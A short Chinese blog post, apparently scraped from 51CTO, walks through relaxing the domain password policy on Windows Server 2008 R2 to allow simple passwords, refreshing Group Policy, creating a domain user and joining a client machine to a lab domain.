可以设置简单密码【全域策略生效】_51CTO博客_域用户密码策略更改 1.设置Windows Server2008 r2的域安全策略。_6号特工的技术博客_51CTO博客 Tools-Group Policy Management 选择Group Policy Objects-Default Domain Controllers Policy，选择Default Domain Policy，右键，编辑 改成如这张图的未定义，更新后不会生效，还是改成上面那张图的样子吧 管理员cmd，用如下命令立即更新用户及组策略，不用重启生效 1gpupdate /force 创建域成员账号 创建用于登录域的账号 主要写登录名 为了方便，永不过期 成员入域 设置首选DNS服务器为DC的ip地址 加入域。会弹窗，输入域管账号和密码，重启后用域账户登进。 注意是**\\**，mytest\\test01 DC上可以看到加到域的电脑💻"}]